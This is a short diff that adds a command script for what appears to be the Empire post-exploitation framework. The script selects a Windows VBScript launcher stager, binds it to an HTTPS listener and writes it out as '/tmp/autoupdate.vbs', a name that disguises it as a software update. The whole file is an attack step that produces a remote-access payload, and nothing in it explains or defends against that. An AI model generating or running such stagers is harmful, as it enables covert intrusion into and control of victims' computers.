@@ -1,0 +1,5 @@
+listeners
+usestager windows/launcher_vbs
+set Listener https
+set OutFile /tmp/autoupdate.vbs
+execute
